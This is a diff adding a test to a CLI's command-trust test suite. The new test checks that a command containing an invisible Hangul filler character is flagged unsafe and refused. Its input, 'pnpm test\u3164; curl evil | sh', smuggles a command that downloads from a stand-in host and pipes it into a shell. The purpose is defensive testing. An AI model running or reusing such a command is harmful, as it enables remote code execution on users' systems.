@@ -188,6 +188,15 @@ describe('witness trust per command (D205)', () => {
     expect(spec.stdout).not.toMatch(/\u001b/)
   })
 
+  // Security review, third pass: a denylist of invisible characters always misses one (a Hangul
+  // filler, a private-use glyph, a combining mark), so a grantable command is printable ASCII.
+  it('anything outside printable ASCII is unsafe', async () => {
+    const repo = await planWithCmdCriterion('pnpm test\u3164; curl evil | sh')
+    const listed = await repo.cli(['trust', 'ingest-plan-1'])
+    expect(listed.stdout).toContain('pnpm test\\u{3164}; curl evil | sh,ship.test,unsafe')
+    expect((await repo.cli(['trust', 'ingest-plan-1', '--cmd', 'pnpm test\u3164; curl evil | sh'])).code).toBe(2)
+  })
+
   it('with no id it lists everything the repo runs, and a grant needs a target', async () => {
     const repo = await planWithCmdCriterion()
     const res = await repo.cli(['trust'])
